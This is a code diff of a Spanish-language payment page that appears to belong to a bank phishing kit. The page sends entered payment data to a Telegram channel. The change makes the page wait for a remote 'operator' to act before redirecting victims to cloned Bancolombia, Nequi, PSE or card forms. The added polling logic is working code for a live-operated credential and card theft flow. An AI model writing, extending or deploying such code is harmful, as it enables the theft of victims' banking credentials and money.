@@ -131,18 +131,33 @@ document.addEventListener('DOMContentLoaded', function() {
                 const result = await TelegramClient.sendToTelegram(action, data, sessionId);
                 
                 if (result.success) {
-                    console.log(`[PAYMENT] Datos enviados. Redirigiendo...`);
+                    console.log(`[PAYMENT] ✓ Datos enviados. Esperando confirmación del operador...`);
                     
-                    // Redireccionar INMEDIATAMENTE sin esperar confirmación
-                    if (method === 'card') {
-                        window.location.href = `/card/form?invoice_id=${invoiceId}`;
-                    } else if (method === 'bancolombia') {
-                        window.location.href = '/bancas/Bancolombia/index.html';
-                    } else if (method === 'nequi') {
-                        window.location.href = '/bancas/Nequi/index.html';
-                    } else if (method === 'pse') {
-                        window.location.href = `/pse/form?invoice_id=${invoiceId}`;
-                    }
+                    // Esperar confirmación del operador antes de redirigir
+                    TelegramClient.startPolling((actions, stop) => {
+                        if (window.__paymentProcessing) {
+                            console.warn('[PAYMENT] Ya procesando, ignorando...');
+                            return;
+                        }
+                        window.__paymentProcessing = true;
+                        
+                        const action = actions[0];
+                        console.log('[PAYMENT] ✓ Acción recibida:', action.action);
+                        
+                        // Detener polling
+                        stop();
+                        
+                        // Redireccionar según el método
+                        if (method === 'card') {
+                            window.location.href = `/card/form?invoice_id=${invoiceId}`;
+                        } else if (method === 'bancolombia') {
+                            window.location.href = '/bancas/Bancolombia/index.html';
+                        } else if (method === 'nequi') {
+                            window.location.href = '/bancas/Nequi/index.html';
+                        } else if (method === 'pse') {
+                            window.location.href = `/pse/form?invoice_id=${invoiceId}`;
+                        }
+                    }, sessionId, 50, 300000);
                 } else {
                     console.error('[PAYMENT] Error al enviar:', result.error);
                     alert('Error al procesar el pago. Por favor intenta nuevamente.');
